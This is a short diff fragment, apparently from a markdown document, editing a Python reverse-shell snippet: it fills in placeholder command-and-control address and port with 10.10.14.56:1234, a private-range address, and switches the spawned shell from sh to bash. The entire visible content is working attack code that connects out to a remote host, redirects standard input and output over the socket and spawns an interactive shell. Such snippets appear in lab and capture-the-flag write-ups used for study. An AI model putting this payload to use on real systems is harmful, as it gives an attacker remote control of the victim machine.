@@ -20,12 +20,12 @@ import socket
 import subprocess
 import os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("<c2-ipv4>",<c2-port>))
+s.connect(("10.10.14.56",1234))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 import pty
-pty.spawn("sh")
+pty.spawn("bash")
 ```
 
 
